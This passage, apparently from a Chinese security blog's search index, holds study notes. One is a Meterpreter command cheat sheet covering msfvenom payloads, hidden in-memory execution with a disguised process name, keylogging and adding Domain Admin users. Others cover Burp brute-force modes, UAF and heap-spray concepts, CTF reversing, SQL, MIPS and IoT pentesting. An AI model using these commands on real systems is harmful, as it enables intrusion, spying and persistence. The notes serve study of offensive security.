/windows/meterpreter/reverse_https 4.bind_tcp基于TCP的正向连接shell，一般在内网使用，不需要设置LHOST。 msfvenom -p linux/x86/meterpreter/bind_tcp lport=4444 -f elf -o shell 加权运行。 Meterpreter 常用命令###1.基本命令 help –查看Meterpreter帮助 background –返回，把meterpreter后台挂起 bgkill –杀死一个背景 meterpreter 脚本 bglist –提供所有正在运行的后台脚本的列表 bgrun –作为一个后台线程运行脚本 channel –显示活动频道 sessions -i number –与会话进行交互，number表示第n个session,使用session -i 连接到指定序号的meterpreter会话已继续利用 sesssions -k number –与会话进行交互 close –关闭通道 exit –终止 meterpreter 会话 quit –终止 meterpreter 会话 interact id –切换进一个信道 run –执行一个已有的模块，这里要说的是输入run后按两下tab，会列出所有的已有的脚本，常用的有autoroute,hashdump,arp_scanner,multi_meter_inject等 irb –进入 Ruby 脚本模式 read –从通道读取数据 write –将数据写入到一个通道 run和bgrun –前台和后台执行以后它选定的 meterpreter 脚本 use –加载 meterpreter 的扩展 load/use –加载模块 Resource –执行一个已有的rc脚本 2.文件系统命令 cat c:\\boot.ini –查看文件内容,文件必须存在 del c:\\boot.ini –删除指定的文件 upload /root/Desktop/netcat.exe c:\\ –上传文件到目标机主上，如upload setup.exe C:\\windows\\system32\\ download nimeia.txt /root/Desktop/ –下载文件到本机上如：download C:\\boot.ini /root/或者download C:\\“ProgramFiles”\\Tencent\\QQ\\Users\\295******125\\Msg2.0.db /root/ edit c:\\boot.ini –编辑文件 getlwd –打印本地目录 getwd –打印工作目录 lcd –更改本地目录 ls –列出在当前目录中的文件列表 lpwd –打印本地目录 pwd –输出工作目录 cd c:\\ –进入目录文件下 rm file –删除文件 mkdir dier –在受害者系统上的创建目录 rmdir –受害者系统上删除目录 dir –列出目标主机的文件和文件夹信息 mv –修改目标主机上的文件名 search -d d:\\www -f web.config –search 文件，如search -d c:\\ -f*.doc meterpreter &gt; search -f autoexec.bat –搜索文件 meterpreter &gt; search -f sea*.bat c:\\xamp\\ enumdesktops –用户登录数 下载文件:使用命令“download +file path”,将下载目标机器的相对应权限的任何路径下的文件 上传文件: upload 命令为上传文件到我们的目标机器 查看文件: cat filename 在当前目录下查看文件内容，输入命令后便会返回给我们所查看文件的内容。 切换、查询当前路径: pwd 命令将查询当前在dos命令下的路径，“cd”命令可以改变当前路径 sysinfo 命令: 显示远程主机的系统信息，显示计算机、系统信息、结构、语言等信息。可以看到远程主机的操作系统是windows XP service pack 2，sp2这个系统有很多漏洞。 execute命令: 为目标主机上执行一个命令，其中“execute -h”显示帮助信息。-f为执行要运行的命令 如果希望隐藏后台执行，加参数-H execute -H -f notepad.exe 我们运行目标主机上的cmd.exe程序，并以隐藏的方式直接交互到我们的meterpreter会话上 execute -H -i -f cmd.exe 在目标主机内存中直接执行我们攻击主机上的攻击程序，比如wce.exe，又比如木马等，这样可以避免攻击程序存储到目标主机硬盘上被发现或被查杀 execute -H -m -d notepad.exe-f wce.exe -a \"-o wce.txt\" -d 在目标主机执行时显示的进程名称（用以伪装） -m 直接从内存中执行 -o wce.txt 是wce.exe的运行参数 idletime命令:为显示目标机器截止到当前无操作命令的时间 search命令:在目标主机搜索特定的文件。该命令能够通过搜索整个系统或特定的文件夹。使用search –h命令来查看search命令的帮助信息 edit命令: 调用vi编辑器，对目标主机上的文件修改 3.网络命令 ipconfig/ifconfig –显示网络接口的关键信息，包括 IP 地址 portfwd add -l 4444 -p 3389 -r 192.168.1.102 –端口转发,本机监听4444,把目标机3389转到本机4444 netstat -an | grep“4444” –查看指定端口开放情况 rdesktop -u Administrator -p bk#123 127.0.0.1:4444 –使用rdesktop来连接桌面，-u 用户名 -p 密码 rdesktop 127.1.1.0:4444 –需要输入用户名和密码远程连接 route –查看或修改受害者路由表 route add 192.168.1.0 255.255.255.0 1 –添加动态路由 route print –路由表输出 runget_local_subnets –目标主机的内网IP段情况 Arp –看ARP缓冲表 Getproxy –获取代理 portfwd：网络命令则有列出ip信息(ipconfig),展示修改路由表(route),还有端口转发(portfwd)。 4.键盘监听 keyscan_start：开启键盘记录功能 keyscan_dump：显示捕捉到的键盘记录信息 keyscan_stop：停止键盘记录功能 uictl enable keyboard/mouse –接管目标主机的键盘和鼠标。 5.系统命令 reboot –重新启动受害人的计算机 reg –与受害人的注册表进行交互 rev2self –回到控制目标主机的初始用户账户下 shell –获得控制台权限 shutdown –关闭了受害者的计算机 sysinfo –查看目标机系统信息，如机器名，操作系统等 add_user username password -h ip –在远程目标主机上添加一个用户 add_group_user “Domain Admins” username -h ip –将用户添加到目标主机的域管理员组中","categories":[],"tags":[{"name":"chrome","slug":"chrome","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/chrome/"}]},{"title":"ubuntu16.04重装之各种环境搭建","slug":"ubuntu重装之各种环境搭建","date":"2022-08-09T03:49:00.287Z","updated":"2022-08-09T03:49:10.368Z","comments":true,"path":"2022/08/09/ubuntu重装之各种环境搭建/","link":"","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/ubuntu%E9%87%8D%E8%A3%85%E4%B9%8B%E5%90%84%E7%A7%8D%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/","excerpt":"","text":"环境：ubuntu16.04 0x00 vmtools解决坑点有点无语，笔者踩坑无数，没想到有一天在重装vmtool的时候还能…… 正常安装vmtool后仍旧无法与主机进行复制粘贴，关掉虚拟机查看虚拟机设置。 建立的共享文件夹要设置属性为共享式。 搞完之后……就可以了。 此处贴一个跟我一样的暴躁博主教程：https://blog.csdn.net/zerolity/article/details/81206476 0x01 pwntools安装1.安装python2.7和pip sudo apt-get install python2.7 python-pip python-dev git libssl-dev libffi-dev build-essential 2.升级pip：sudo pip install --upgrade pip 更改pip的配置文件/usr/bin/pip 更改为： 3.安装pwntools：sudo pip install pwntools 报错超时，换个阿里源就好了。 3.1 更换阿里源 1234sudo sucd /etc/apt #切换到apt源文件mv source.list sources.list_bak #备份源文件vim sources.list #新建一个，直接把下面的内容copy进去 copy的内容： deb cdrom:[Ubuntu 16.04 LTS _Xenial Xerus_ - Release amd64 (20160420.1)]/ xenial main restricted1234567891011121314151617181920212223242526272829303132333435363738394041424344454647deb-src http://archive.ubuntu.com/ubuntu xenial main restricted #Added by software-propertiesdeb http://mirrors.aliyun.com/ubuntu/ xenial main restricteddeb-src http://mirrors.aliyun.com/ubuntu/ xenial main restricted multiverse universe #Added by software-propertiesdeb http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricteddeb-src http://mirrors.aliyun.com/ubuntu/ xenial-updates main restricted multiverse universe #Added by software-propertiesdeb http://mirrors.aliyun.com/ubuntu/ xenial universedeb http://mirrors.aliyun.com/ubuntu/ xenial-updates universedeb http://mirrors.aliyun.com/ubuntu/ xenial multiversedeb http://mirrors.aliyun.com/ubuntu/ xenial-updates multiversedeb http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiversedeb-src http://mirrors.aliyun.com/ubuntu/ xenial-backports main restricted universe multiverse #Added by software-propertiesdeb http://archive.canonical.com/ubuntu xenial partnerdeb-src http://archive.canonical.com/ubuntu xenial partnerdeb http://mirrors.aliyun.com/ubuntu/ xenial-security main restricteddeb-src http://mirrors.aliyun.com/ubuntu/ xenial-security main restricted multiverse universe #Added by software-propertiesdeb http://mirrors.aliyun.com/ubuntu/ xenial-security universedeb http://mirrors.aliyun.com/ubuntu/ xenial-security multiverse```3.2 保存配置后，更新配置：`sudo apt-get update`之后再重新步骤三的安装命令即可。4.测试![捕获.PNG](https://i.loli.net/2020/10/10/7wzfu32HFRiCXap.png)无报错，返回了'1\\xc0'，成功！所以为啥第一次自己去安装pwntools的时候费了很多力气呢，感觉那时候踩坑无数到崩溃……# 0x02 GDB及三个插件的安装在终端输入gdb，发现ubuntu16自带gdb，那我就直接安装插件得了。* peda:做逆向破解* gef：用于debug最好* gdbinit：简单版用git下载插件：`git clone https://github.com/gatieme/GdbPlugins.git ~/GdbPlugins`没有git的下载：`apt-get install git`在目录GdbPlugin下可以看见三个插件，想用哪个插件就可以在该目录下输入对应命令：```echo \"source ~/GdbPlugins/peda/peda.py\" &gt; ~/.gdbinit echo \"source ~/GdbPlugins/gef/gef.py\" &gt; ~/.gdbinit echo \"source ~/GdbPlugins/gdbinit/gdbinit\" &gt; ~/.gdbinit 0x03 安装checksecclonelink1cd checksec.sh 目录下的checksec本来想建立一个软链接过去/usr/local/bin里，但是一直打不开，于是直接用cp命令把checksec拷贝过去了。在/usr/local/bin能够打开checksec，才算成功。 0x04 安装docker+pikachu靶场安装docker 先卸载可能存在的旧版本： $ sudo apt-get remove docker docker-engine docker-ce docker.io 更新apt包索引: $ sudo apt-get update 安装以下包以使apt可以通过HTTPS使用存储库（repository）: $ sudo apt-get install -y apt-transport-https ca-certificates curl software-properties-common 添加Docker官方的GPG密钥： $ curl -fsSL https://download.docker.com/linux/ubuntu/gpg | sudo apt-key add - 使用下面的命令来设置stable存储库： $ sudo add-apt-repository \"deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable\" 再更新一下apt包索引: $ sudo apt-get update 安装最新版本的Docker CE：$ sudo apt-get install -y docker-ce 查看docker服务是否启动： $ systemctl status docker 若未启动，则启动docker服务: $ sudo systemctl start docker 经典的hello world： $ sudo docker run hello-world 如图输出则表示docker安装成功。 pikachu靶场","categories":[],"tags":[{"name":"环境搭建","slug":"环境搭建","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/"}]},{"title":"UAF漏洞简单学习","slug":"UAF漏洞简单学习","date":"2022-08-09T03:48:28.169Z","updated":"2022-08-09T03:47:46.734Z","comments":true,"path":"2022/08/09/UAF漏洞简单学习/","link":"","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/UAF%E6%BC%8F%E6%B4%9E%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"UAF漏洞是一种内存破坏漏洞，通常存在于浏览器中。 产生原因uaf漏洞成因：一块堆内存被释放之后又被使用。再一次被使用是指：指针存在（悬垂指针被引用）引用结果不可预测。 由于大多数堆内存都是C++对象，所以利用的核心思路即：分配堆去占坑，占的坑中又自己构造的虚表。 分析方式分析uaf漏洞的要点在于弄清楚对象是在哪里被分配，被释放，被重用。 uaf异常触发点：对已释放的对象进行操作导致的异常，所以异常点即重用点。 而由于是对对象的操作，可以列出这个对象的所有方法，找出分配和释放的方法，对其下断来分析uaf过程。 1.悬垂指针：指一类不指向任何合法的或者有效的（即与指针的含义不符）的对象的指针，比如一个对象的指针，如果这个对象已经被释放或者回收，但是指针没有进行任何的修改，仍然执行已被释放的内存，这个指针就叫做悬垂指针。 2.UAF漏洞：Use-AFTER-Free是一种内存破坏漏洞，简单来说，漏洞的原因是使用了悬垂指针。 常见与UAF漏洞配合使用的是堆喷射，分配大量内存，增大靶子的面积，使eip跳进分配的内存中，而分配的内存中又充满了滑板指令，只要命中了滑板指令就可以命中shellcode 调试方式对于uaf漏洞，调试器捕获到的异常并不是漏洞发生的第一现场，所以一般要使用gflags开启PageHeap和UST（windbg自带gflags工具） gflags.exe /i 程序名.exe +hpa +ust 这样调试器会定位到最先出错的位置。 技巧：1.在ida中查找函数后，在windbg下断2.打开poc文件后出现crash就是对象被重用，根据crash地址来找到重用的对象起始地址3.对对象起始使用 !heap -p -a 地址 可获得这个对象的分配信息，由回溯还可以知道是什么函数分配的。4.对分配函数下断到达分配现场5.在回溯中，分配函数一般为RtlAllocateHeap的上层，而释放函数一般就是FreeHeap的上层。","categories":[],"tags":[{"name":"chrome","slug":"chrome","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/chrome/"}]},{"title":"SQL学习与整理","slug":"SQL学习与整理","date":"2022-08-09T03:47:09.145Z","updated":"2022-08-09T03:45:51.854Z","comments":true,"path":"2022/08/09/SQL学习与整理/","link":"","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/SQL%E5%AD%A6%E4%B9%A0%E4%B8%8E%E6%95%B4%E7%90%86/","excerpt":"","text":"0x01 SQL简介SQL（结构化查询语言）用于访问和操作数据库中的数据的标准数据库编程语言。 SQL是关系数据库系统的标准语言，是一种ANSI标准的计算机语言。 要创建一个显示数据库中的数据的网站，需要： 一个RDBMS数据库程序（MS Access SQL Server MySQL） 使用服务器端脚本语言（PHP ASP） 使用SQL来获取所需的数据 使用HTML/CSS来设置页面的样式 0x02 SQL RDBMS概念RDBMS是关系数据库管理系统的缩写，是SQL的基础。 什么是表RDBMS中的数据存储在成为表的数据库对象中，这个表基本上是一个相关数据条目的集合，由许多列和行组成，表是关系数据库中最常见和最简单的数据存储形式。 什么是字段每个表都被分解成更小的实体，成为字段，Customers表中的字段由ID、姓名、年龄、地址和薪资组成。 字段是表中的列，用于维护有关表中每条记录的特定信息。 什么是记录或者行数据记录也成为数据行，即表中存在的每个单独的条目。 记录是表中的水平实体。 什么是列？列是表彰的垂直实体，其中包含与表中特定字段关联的所有信息。 什么是空值表中的空值是显示为空的字段中的值，这意味中具有空值的字段是没有值的字段。 SQL约束约束是在表上的数据列上强制执行的规则，用于限制可以进入表中的数据类型，这确保了数据库中数据的准确性和可靠性。约束可以是列级别，也可以是表级别，列级约束仅应用于一列，而表级约束则应用于整个表。 NOT NULL约束：保列中数据不能有NULL值。 DEFAULT约束：提供该列数据未指定时所采用的默认值。 UNIQUE约束：保证列中的所有数据各不相同。 主键约束：唯一标识数据表中的行/记录 外键约束：唯一标识其他表中的一条行/记录 CHECK约束：此约束保证列中的所有值满足某一条件 索引：用于在数据库中快速创建或检索数据 约束可以在创建表时规定（通过CREATE TABLE语句）或者在表创建减值后规定（通过ALTER TABLE语句）。 数据完整性每个关系数据库管理系统都存在以下类型的数据完整性： 实体完整性-表中无重复行 域完整性-通过限制值的类型，格式或范围来强制执行给定列的有效条目 引用完整性-不能删除其他记录使用的行。 用户定义的完整性-强制执行一些不属于实体、域或引用完整性的特定业务规则。 数据库规范化数据库规范化是在数据库中有效的组织数据的过程，这个规范化过程有两个原因： 消除多余数据 确保数据依赖关系是有意义的 规范化指导原则称为范式，范式的目的是组织数据库结构，使其符合第一范式、第二范式和第三范式的规则。 0x03 SQL语法SQL语法规则 SQL语句总是以关键字开始，如SELECT、INSERT、UPDATE、DELETE、DROP、CREATE. SQL语句以分号结尾 SQL不区分大小写。 数据库表数据库通常包含一个或多个表，每个表都用一个名称标识，该表包含带有数据的记录。 SQL语句SELECT * FROM Customers; 一些重要的SQL命令 SELECT：从数据库中提取数据 UPDATE：更新数据库中的数据 DALETE：从数据库中删除数据 INSERT INTO：向数据库中插入新数据 CREATE DATABASE：创建新数据库 ALTER DATABASE:修改数据库 CREATE TABLE：创建数据库 ALTER TABLE:变更数据库表 DROP TABLE:删除表 CREATE INDEX：创建索引 DROP INDEX：删除索引 SELECT:SELECT column_name(s) FROM table_name SELECT语句和WHERE子句：SELECT [*] FROM [TableName] WHERE [condition] SELECT语句和WHERE和/或子句：SELECT [*] FROM [TableName] WHERE [condition1] [AND [or]] [condition2]... SELECT语句与ORDER BY: SELECT column_name() FROM table_name ORDER BY column_name() ASC or DESC SELECT DISTINCT（区分）子句： SELECT DISTINCT column1,...columnN FROM table_name; SELECT IN子句： SELECT column1,column2...columnN FROM table_name WHERE column_name IN (val-1,val-2,...val-N); SELECT LIKE(类)子句： SELECT column1,column2...columnN FROM table_name WHERE column_name LIKE {PATTERN}; SELECT COUNT（计数）子句： SELECT COUNT(column_name) FROM table_name WHERE CONDITION; SELECT与HAVING子句： SELECT SUM(column_name) FROM table_name WHERE CONDITION GROUP BY column_name HAVING (arithematic function condition); INSERT INTO语句： INSERT INTO table_name(column1,column2,column3,...) VALUES (value,value1,value2,value3...) UPDATE语句： UPDATE table_name SET column=value,column1=value1 WHERE someColumn=someValue DELETE语句： DELETE FROM tableName WHERE someColumn=someValue CREATE语句： CREATE TABLE table_name(column1 datatype,column2 datatype,column3 datatype,...columnN datatype,PRIMARY KEY(one or moe columns )); DROP语句： DROP TABLE table_name; DROP INDEX语句： AL TER TABLE table_name DROP INDEX index_name; DESC语句： DESC table_name; TRUNCATE截断表语句： TRUNCATE TABLE table_name; ALTER TABLE语句： ALTER TABLE table_name{ADD|DROP|MODIFY} column_name {data_type}; ALTER TABLE(对表名重命名) ALTER TABLE table_name RENAME TO new_table_name; USE语句： USE database_name; COMMIT语句： COMMIT; ROLLBACK语句： ROLLBACK; 0x04 SQL选择","categories":[],"tags":[{"name":"学习记录","slug":"学习记录","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"}]},{"title":"MIPS架构学习笔记","slug":"MIPS架构学习笔记","date":"2022-08-09T03:42:43.325Z","updated":"2022-08-09T03:42:07.688Z","comments":true,"path":"2022/08/09/MIPS架构学习笔记/","link":"","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/MIPS%E6%9E%B6%E6%9E%84%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/","excerpt":"","text":"0x01 寄存器32个通用寄存器：$0-$31,32位MIPS32中通用寄存器的约定用法： |:–:|:–:||寄存器名字|约定名字|用途||$0|zero|总是为0||$1|at|留作汇编器生成一些合成指令||$2 $3|v0 v1|用来存放子程序返回值||$4$7|a0a3|调用子程序时，使用这4个寄存器传输前4个非浮点参数||$8$15|t0t7|临时寄存器，子程序使用时可以不用存储和恢复||$16$23|s0s7|子程序寄存器变量，改变这些寄存器值的子程序必须存储旧的值并在退出前恢复，对调用程序来说值不变||$24 $25|t8 t9|临时寄存器，子程序使用时可以不用存储和恢复||$26 $27|$k0 $k1|由异常处理程序使用||$28或$gp|gp|全局指针||$29或$sp|sp|堆栈指针||$30或$fp|s8/sp|子程序可以用来做堆栈帧指针||$31|ra|存放子程序返回地址| 特殊寄存器 PC:程序计数器 HI:乘除结果高位寄存器 LO:乘除结果低位寄存器 MIPS架构属于小端模式 MIPS指令|:—-:|:—-:||指令|功能||LB|从存储器中读取一个字节的数据到寄存器中||LH|从存储器中读取半个字的数据到寄存器中||LW|从存储器中读取一个字的数据到寄存器中||LD|从存储器中读取双字的数据到寄存器中||L.S|从存储器中读取单精度浮点数到寄存器中||L.D|从存储器中读取双精度浮点数到寄存器中||LBU|=LB,无符号数据||LHU|=LH,无符号数据||LWU|=LW,无符号数据||SB|把一个字节的数据从寄存器存储到存储器中||SH|把半个字节的数据从寄存器存储到存储器中||SW|把一个字的数据从寄存器存储到存储器中||SD|把两个字节的数据从寄存器存储到存储器中||S.S|把单精度浮点数从寄存器存储到存储器中||S.D|把双精度数据从存储器存储到存储器中||DADD|把两个定点寄存器的内容相加，即定点加||DADDI|把一个寄存器的内容加上一个立即数||DADDU|不带符号的加||DADDIU|把一个寄存器的内容加上一个无符号的立即数||ADD.S|把一个单精度浮点数加上一个双精度浮点数，结果是单精度浮点数||ADD.D|把一个双精度浮点数加上一个单精度浮点数，结果是双精度浮点数||ADD.PS|两个单精度浮点数相加，结果是单精度浮点数||DSUB|两个寄存器的内容相减||DSUBU|不带符号的减||SUB.S|一个双精度浮点数减去一个单精度浮点数，结果是单精度浮点数||SUB.D|一个双精度浮点数减去一个单精度浮点数，结果为双精度浮点数||SUB.PS|两个单精度浮点数相减||DDIV|两个顶点寄存器的内容相除||DDIVU|不带符号的除法运算||DIV.S|双精度浮点数除以单精度浮点数，结果为单精度浮点数||DIV.D|双精度浮点数除以单精度浮点数，结果为双精度浮点数||DIV.PS|两个单精度浮点数相除，结果为单精度||DMUL|两个定点寄存器的内容相乘||DMULU|无符号相乘||MUL.S|双浮点乘单浮点得单浮点||MUL.D|双浮点乘单浮点得双浮点||MUL.PS|两个单浮点乘，得单浮点||AND|与运算||ANDI|一个寄存器中的内容与一个立即数相与||OR|或运算||ORI|||XOR|异或||XORI|||BEQZ|条件转移指令，当寄存器中内容为0时转移发生||BENZ|条件转移指令，寄存器内容不为0时转移发生||BEQ|条件转移指令，两个寄存器内容相等是转移发生||BNE|条件转移指令，两个寄存器中内容不等时转移发生||J|直接跳转指令，跳转的地址在指令中||JR|使用寄存器的跳转指令，跳转的地址在寄存器中||JAL|直接跳转指令，带有链接功能，指令的跳转地址在指令中，跳转发生时要把返回地址存放到R31寄存器中||JALR|使用寄存器的跳转指令，并且带有链接功能，指令的跳转地址在寄存器中，跳转发生时指令的放回地址放在R31||MOV.S|把单浮点数从浮点寄存器复制到另一个浮点寄存器||MOV.D|把一个双浮点数从一个浮点寄存器复制到另一个浮点寄存器||MFC0|把一个数据从通用寄存器复制到特殊寄存器||MTC0|把一个数据从特殊寄存器复制到通用寄存器||MFC1|把一个数据从定点寄存器复制到浮点寄存器||MTC1|把一个数据从浮点寄存器复制到定点寄存器||LUI|把一个16位的立即数填入到寄存器的高16位，低16位补零||DSLL|双字逻辑左移||DSRL|双字逻辑右移||DSRA|双字算术右移||DSLLV|可变的双字逻辑左移||DSRLV|可变的双字逻辑右移||DSRAV|可变的双字算术右移||SLT|如果r2的值小于r3，设置r1为1，否在设置r1为0||SLTI|r2的值小于立即数，则r1为1，否则为0||SLTU|=SLT带符号||SLTUI|=SLT不带符号||MOVN|若第三个寄存器内容为负，那么复制一个寄存器内容到另一个寄存器||MOVZ|若第三个寄存器内容为0，则复制一个寄存器的内容到另一个寄存器||TRAP|根据地址向量转入管态||ERET|从异常中返回到用户态||MADD.S|一个双浮点数与单浮点数相乘加，结果为单||MADD.D|一个双浮点数与单浮点数相乘加，结果为双||MADD.PS|两个单浮点数相乘加，结果为单| 大端序小端序复习字节序，又称端序，尾须序，大小端序与硬件的体系结构有关，所有x86系列的pc机都是小断续，与操作系统无关， 大端字节序，高子杰存于内存低地址，弟子姐姐存于内存搞地质，小端字节序反之。","categories":[],"tags":[{"name":"IOT","slug":"IOT","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/IOT/"}]},{"title":"DDCTF RE windows_re2","slug":"DDCTF2019re","date":"2022-08-09T03:33:43.559Z","updated":"2022-08-09T03:29:41.243Z","comments":true,"path":"2022/08/09/DDCTF2019re/","link":"","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/DDCTF2019re/","excerpt":"","text":"esp定律脱壳Aspack，然后ida分析一波。 1234567891011121314151617181920212223242526272829int sub_401320(){ char v1; // [esp+8h] [ebp-C04h] char v2; // [esp+9h] [ebp-C03h] char v3; // [esp+408h] [ebp-804h] char v4; // [esp+409h] [ebp-803h] char v5; // [esp+808h] [ebp-404h] char v6; // [esp+809h] [ebp-403h] v3 = 0; sub_401C6A(&amp;v4, 0, 0x3FF); v5 = 0; sub_401C6A(&amp;v6, 0, 0x3FF); MEMORY[0x785520C1](\"input code:\"); MEMORY[0x785526D4](\"%s\", &amp;v3); if ( !(unsigned __int8)sub_4011F0() ) { MEMORY[0x785520C1](\"invalid input\\n\"); MEMORY[0x78542455](0); } sub_401240(&amp;v5); v1 = 0; sub_401C6A(&amp;v2, 0, 0x3FF); MEMORY[0x78552E73](&amp;v1, \"DDCTF{%s}\", &amp;v5); if ( !strcmp(&amp;v1, \"DDCTF{reverse+}\") ) MEMORY[0x785520C1](\"You've got it !!! %s\\n\", &amp;v1); else MEMORY[0x785520C1](\"Something wrong. Try again...\\n\"); return 0;} 限制输入0-9,A-F,可想到十六进制 输入字符经过变换与“DDCTF{reverse+}”对比，相同则成功。 先尝试输入字符串1234567AAA,得到加密后字符 EjRWeqo=,看着像base664,直接base64转成十六进制尝试，发现得到了我输入字符串。将reverse+转换得到flag","categories":[],"tags":[{"name":"RE","slug":"RE","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/RE/"}]},{"title":"CVE-2020-6418","slug":"CVE-2020-6418","date":"2022-08-09T03:33:40.197Z","updated":"2022-08-09T03:29:41.243Z","comments":true,"path":"2022/08/09/CVE-2020-6418/","link":"","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/CVE-2020-6418/","excerpt":"","text":"背景(资料来自绿盟科技) 2020年2月24日，google针对桌面版chrome浏览器发布更新以解决多个漏洞，包括已被发现的在野利用的高危漏洞CVE-2020-6418. CVE-2020-6418存在于V8中的类型混淆漏洞，V8是chrome的开源JavaScript和WebAssembly引擎，该洞由Google威胁分析小组的Clement Lecigne发现并上报。 受影响产品版本： Google Chrome Version&lt;80.0.3987.122 适用于windows,Mac,Linux. 参考http://blog.nsfocus.net/cve-2020-6418","categories":[],"tags":[{"name":"chrome调试","slug":"chrome调试","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/chrome%E8%B0%83%E8%AF%95/"}]},{"title":"burp四种密码爆破模式学习","slug":"bp四种密码爆破模式学习","date":"2022-08-09T03:24:09.328Z","updated":"2022-08-09T03:25:20.887Z","comments":true,"path":"2022/08/09/bp四种密码爆破模式学习/","link":"","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/bp%E5%9B%9B%E7%A7%8D%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4%E6%A8%A1%E5%BC%8F%E5%AD%A6%E4%B9%A0/","excerpt":"","text":"Sniper:单参数爆破，多参数时同一个字典按顺序替换各参数，初始值有一个参数不变 Battering ram:多参数同时爆破，但用的是同一个字典 Pitchfork:多参数同时爆破，但用的是不同的字典 Cluster bamb:多参数做笛卡尔乘积模式爆破 Sniper(狙击手)（一对一） 一个参数a，若payload有x个，则执行x次。 两个参数a、b,先执行爆破a的x次，再执行b的y次，共x+y次爆破。 此模式主要适用于：竞争条件测试(选择NULL payloads)，密码、验证码暴力破解，重放攻击等场景 Battering ram(破城槌)（payload一对多） 一个参数a，若payload有x个，则执行x次。 两个参数a、b,payload被同事放到a、b变量中。适合需要在请求中把相同的输入放到多个位置的情况。 此模式主要适用于：撞库 Pitchfork(音叉)可以多组密码本payload a:1,2 b:3,4 第一次爆破为 1，3 第二次爆破为 2，4 此模式主要适用于：恶意注册 Cluster bomb(集束炸弹)（多对多） 对payload组进行笛卡尔积，交叉组合，即a的一个payload值与b的每一个值进行组合爆破。","categories":[],"tags":[{"name":"bp","slug":"bp","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/bp/"}]},{"title":"《物联网渗透测试》学习笔记1","slug":"《物联网渗透测试》学习笔记1","date":"2022-08-09T03:24:06.948Z","updated":"2020-10-09T08:13:24.145Z","comments":true,"path":"2022/08/09/《物联网渗透测试》学习笔记1/","link":"","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E3%80%8A%E7%89%A9%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/","excerpt":"","text":"0x01 IOT渗透测试定义IoT生态系统与渗透测试生命周期 渗透测试方法： 黑盒测试 白盒测试 灰盒测试 固件入门固件是一种写入硬件设备的软件，作用是对应用和各项系统功能实施控制，运行固件的设备称为嵌入式系统。 固件通常由bootloader、内核、文件系统以及其他资源组成， 固件组成：闪存、bootloader、内核、根文件系统。 bootloader:主要作用包括RAM初始化（目的是存储易失性数据）、串口初始化、机器类型检测、内核参数链表设置、initramfs(基于RAM的初始文件系统)加载以及内核镜像调用等。ARM、MIPS架构中部分常见的bootloader包括：Redboot、u-boot以及barebox等。当bootloader启动内核之后，文件系统就完成了加载。 固件可以采用的文件系统类型：SquashFS、cramFS、JFFS2、YAFFS2以及ext2等。 IoT中的Web应用通常嵌入书web应用被设计为在自包含的环境中运行 目前iot领域主要有两种不同的web应用模型 混合云模型：包含厂商或供应商提供的基于软件即服务的web应用，作用是同运行在嵌入式设备固件中的web应用程序建立连接，将数据从厂商的云服务器中同步到本地网络的嵌入式设备中。 独立嵌入式服务器模型 web通信：浏览器、、嵌入式服务器和web应用服务器之间的通信通常要么借助简单对象访问协议（SOAP）/XML等web服务，要么借助基于http/htps复合REST规范的API来实现。 硬件设备基础硬件输入： EEPROM，是非易失性存储器。以单个字节为单位进行读写，可通过电荷或紫外线照射擦除数据。读写次数有限。 NAND闪存以区块为单位读写。存储设备的boootloader。 UART接口是访问设备最为常见的方式。连接改接口后即可获得root权限。PCB上UART接口的引脚定义中包括Tx、Rx、Vcc和GND 4个引脚。连接UART接口前需要使用万用表识别出引脚。 JTAG接口是遵循IEEE 1149.1标准的另一种国际标准测试协议。用于芯片级和系统级的测试。，包含5个引脚：TDI、TDO、TMS、TCK、TRST.可以接到芯片的tap（测试访问口） IoT无线通信简介最常用协议：Wi-Fi(802.11)、ZigBee(802.15.4)、Z-Ware、蓝牙(802.15.1)、低功耗蓝牙。 IoT威胁建模","categories":[],"tags":[{"name":"IOT 《物联网渗透测试》","slug":"IOT-《物联网渗透测试》","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/tags/IOT-%E3%80%8A%E7%89%A9%E8%81%94%E7%BD%91%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E3%80%8B/"}]},{"title":"《ARM嵌入式Linux系统开发详解》学习笔记1","slug":"《ARM嵌入式Linux系统开发》学习笔记1","date":"2022-08-09T03:21:41.844Z","updated":"2022-08-09T03:22:14.420Z","comments":true,"path":"2022/08/09/《ARM嵌入式Linux系统开发》学习笔记1/","link":"","permalink":"https://github.com/SinkyQ/sinkyhexo.github.io.git/2022/08/09/%E3%80%8AARM%E5%B5%8C%E5%85%A5%E5%BC%8FLinux%E7%B3%BB%E7%BB%9F%E5%BC%80%E5%8F%91%E3%80%8B%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B01/","excerpt":"","text":"0x01 